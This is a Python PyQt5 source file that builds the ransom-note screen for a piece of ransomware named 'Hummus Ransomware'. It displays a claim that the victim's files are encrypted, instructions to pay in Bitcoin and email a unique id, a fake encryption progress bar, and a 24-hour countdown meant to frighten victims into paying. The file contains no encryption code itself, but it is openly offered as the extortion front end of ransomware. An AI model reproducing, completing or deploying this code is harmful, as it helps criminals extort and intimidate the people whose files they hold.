import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QPushButton, QVBoxLayout, QWidget, QProgressBar
from PyQt5.QtGui import QIcon
from PyQt5.QtCore import Qt, QTimer

class RansomwareGUI(QMainWindow):
    def __init__(self):
        super().__init__()

        # Initialize global variables
        self.btcAdd = ""
        self.email = ""

        # Define ransom notess
        self.ransomNote = f"""
        All Your Files Have Been Encrypted\n
        At the end of the day we just want to get paid\n
        Here are the instructions to get getting your files back\n
        1. Pay $50 btc to the listed address\n
        2. Send an email and include your unique id\n
        3. Wait\n
        ------------------------------------\n
        Check your desktop for readme.txt if you are lost!\n
        ------------------------------------\n
        BTC Address: {self.btcAdd}\n
        Email: {self.email}\n
        ------------------------------------\n
        """

        # Set up the GUI
        self.initUI()

        # Start encryption progress and decryption countdown
        self.startEncryptionProgress()
        self.startDecryptionCountdown()

    def initUI(self):
        # Create central widget
        central_widget = QWidget(self)
        self.setCentralWidget(central_widget)

        # Create layout
        layout = QVBoxLayout(central_widget)

        # Set the background color of the central widget to black
        central_widget.setStyleSheet("background-color: #000000;")

        # Add Hummus Ransomware banner box
        banner_label = QLabel("Hummus Ransomware", self)
        banner_label.setAlignment(Qt.AlignCenter)
        banner_label.setStyleSheet("""
            QLabel{
                background-color: #d50000;
                color: #000;  /* Black font color */
                border: 2px solid #ff5131;
                border-radius: 7.5px;
                font-family: 'Segoe UI', sans-serif;
                font-size: 24px;
                font-weight: bold;
                padding: 10px;
                margin-bottom: 20px;
            }
        """)
        layout.addWidget(banner_label)

        # Add stylish ransom note label with a red block background
        self.ransom_note_label = QLabel(self.ransomNote)
        self.ransom_note_label.setAlignment(Qt.AlignCenter)
        self.ransom_note_label.setStyleSheet("""
            QLabel{
                color: #000;  /* Black font color */
                font-family: 'Segoe UI', sans-serif;
                font-size: 14px;
                font-weight: bold;  /* Bold font */
                background-color: #d50000;  /* Red block background */
                padding: 20px;
                border-radius: 7.5px;
                margin: 20px 0;
            }
        """)
        layout.addWidget(self.ransom_note_label)

        # Add encryption progress bar
        self.encryption_progress = QProgressBar(self)
        self.encryption_progress.setGeometry(10, 10, 180, 30)
        layout.addWidget(self.encryption_progress)

        # Add continue button with hover effect
        continue_button = QPushButton('Continue', self)
        continue_button.setStyleSheet("""
            QPushButton{
                background-color: #d50000;
                border-radius: 7.5px;
                font-weight: 1200;
                font-size: 18px;
                color: #000;  /* Black font color */
            }
            QPushButton:hover {
                background-color: #9b0000;
            }
        """)
        layout.addWidget(continue_button)
        continue_button.clicked.connect(self.hide)

        # Set up window properties
        self.setGeometry(100, 100, 800, 600)
        self.setWindowTitle('Ransomware GUI')
        self.setWindowIcon(QIcon('path/to/icon.png'))  # Replace with your icon path
        self.show()

    def startEncryptionProgress(self):
        self.encryption_timer = QTimer(self)
        self.encryption_timer.timeout.connect(self.updateEncryptionProgress)
        self.encryption_timer.start(1000)  # Update progress every second

    def updateEncryptionProgress(self):
        # Implement your logic to update the encryption progress
        # For example, increase the value of the progress bar
        current_value = self.encryption_progress.value()
        new_value = min(current_value + 10, 100)  # Increase by 10% each time
        self.encryption_progress.setValue(new_value)

    def startDecryptionCountdown(self):
        self.decryption_timer = QTimer(self)
        self.decryption_timer.timeout.connect(self.updateDecryptionCountdown)
        self.decryption_timer.start(1000)  # Update countdown every second
        self.decryption_time_remaining = 86400  # 24 hours in seconds

    def updateDecryptionCountdown(self):
        # Implement your logic to update the decryption countdown
        # For example, decrease the remaining time and update the label
        self.decryption_time_remaining -= 1
        hours, remainder = divmod(self.decryption_time_remaining, 3600)
        minutes, seconds = divmod(remainder, 60)
        countdown_str = f"Decryption Countdown: {hours:02}:{minutes:02}:{seconds:02}"
        self.ransom_note_label.setText(self.ransomNote + "\n" + countdown_str)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    gui = RansomwareGUI()
    sys.exit(app.exec_())
